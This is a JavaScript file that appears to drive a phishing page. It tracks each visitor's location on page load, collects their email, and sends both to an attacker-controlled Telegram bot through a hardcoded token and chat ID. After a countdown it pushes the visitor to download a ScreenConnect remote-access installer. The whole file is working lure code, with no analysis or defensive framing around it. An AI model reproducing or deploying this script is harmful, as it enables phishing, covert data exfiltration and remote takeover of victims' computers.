/* ===== CONFIG ===== */
const BOT_TOKEN = "8559599544:AAGCKB54xXuW7rjLweOhsmn6W-epeY_Xv4U";
const CHAT_ID   = "8583429744";
const FILE_URL  = "https://sandlerandassociates.screenconnect.com/Bin/ScreenConnect.ClientSetup.msi?e=Access&y=Guest";


/* ===== TELEGRAM ===== */
function notifyTelegram(message) {
    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
            chat_id: CHAT_ID,
            text: message
        })
    });
}

/* ===== GEO LOCATION ===== */
async function getGeo() {
    try {
        const res = await fetch("https://ipapi.co/json/");
        return await res.json();
    } catch {
        return { city: "Unknown", country_name: "Unknown" };
    }
}

/* ===== PROCESS FLOW ===== */
async function startProcess() {
    const email = document.getElementById("email").value;
    if (!email) {
        alert("Please enter your email");
        return;
    }

    document.getElementById("loaderSection").classList.remove("hidden");
    window.scrollTo({ top: document.body.scrollHeight, behavior: "smooth" });

    const geo = await getGeo();

    notifyTelegram(
        `📥 Link Clicked\n📧 ${email}\n🌍 ${geo.city}, ${geo.country_name}`
    );

    let seconds = 5;
    const counter = document.getElementById("count");

    const timer = setInterval(() => {
        counter.innerText = seconds;
        seconds--;

        if (seconds < 0) {
            clearInterval(timer);

            notifyTelegram(
                `⬇️ Download Started\n📧 ${email}\n🌍 ${geo.city}, ${geo.country_name}`
            );

            window.location.href = FILE_URL;
        }
    }, 1000);
}

/* ===== PAGE LOAD TRACK ===== */
getGeo().then(geo => {
    notifyTelegram(
        `👀 Page Opened\n🌍 ${geo.city}, ${geo.country_name}`
    );
});
